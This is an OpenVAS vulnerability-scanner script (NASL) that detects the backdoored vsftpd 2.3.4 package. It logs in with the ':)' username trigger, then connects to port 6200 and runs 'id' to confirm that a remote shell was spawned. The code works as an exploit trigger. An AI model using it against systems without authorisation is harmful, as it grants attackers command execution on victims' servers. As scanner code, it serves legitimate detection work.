###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_vsftpd_backdoor_07_2011.nasl 13 2013-10-27 12:16:33Z jan $
#
# vsftpd Compromised Source Packages Backdoor Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "vsftpd is prone to a backdoor vulnerability.

Attackers can exploit this issue to execute arbitrary commands in the
context of the application. Successful attacks will compromise the
affected application.

The vsftpd 2.3.4 source package is affected.";

tag_solution = "The repaired package can be downloaded from
https://security.appspot.com/vsftpd.html. Please validate the package
with its signature.";

if (description)
{
 script_id(103185);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-07-05 14:24:57 +0200 (Tue, 05 Jul 2011)");
 script_bugtraq_id(48539);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("vsftpd Compromised Source Packages Backdoor Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/48539");
 script_xref(name : "URL" , value : "http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html");
 script_xref(name : "URL" , value : "https://security.appspot.com/vsftpd.html");
 script_xref(name : "URL" , value : "http://vsftpd.beasts.org/");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if vsftpd is installed with a backdoor");
 script_category(ACT_ATTACK);
 script_family("Gain a shell remotely");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("ftpserver_detect_type_nd_version.nasl");
 script_require_ports(21);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("ftp_func.inc");

shellport = 6200;

port = get_kb_item("Services/ftp");

if(!port){
    port = 21;
}

if( !get_port_state(port) ) { 
  exit(0);
}  

if(!banner = get_ftp_banner(port)) exit(0);
if("vsftpd" >!< tolower(banner))exit(0);

function check_vuln() {

  sock = open_sock_tcp(shellport);
  if(!sock) return FALSE;

  send(socket:sock, data:string("id;\r\nexit;\r\n"));
  buf = recv(socket:sock, length:4096);
  close(sock);

  if(egrep(pattern:"uid=[0-9]+.*gid=[0-9]+", string:buf)) {
    return TRUE;
  }  

  return FALSE;
}  


if( check_vuln() ) { # check if there already exist a shell on port 6200
  security_hole(port:shellport); # report this vuln on both ports. Just to be sure...
  security_hole(port:port);
  exit(0);
}  


soc = open_sock_tcp(port);
if(!soc){
    exit(0);
}

ftp_recv_line(socket:soc);

for(i=0;i<=3;i++) {

  send(socket:soc, data:string("USER X:)\r\n"));
  ftp_recv_line(socket:soc);

  send(socket:soc, data:string("PASS X\r\n"));     
  ftp_recv_line(socket:soc);

  sleep(10); # slow hosts need some time to spawn the shell

  if( check_vuln() ) {
    close(soc);
    security_hole(port:shellport); # reprt this vuln on both ports. Just to be sure...
    security_hole(port:port);
    exit(0);
  } 
}

close(soc);
exit(0);
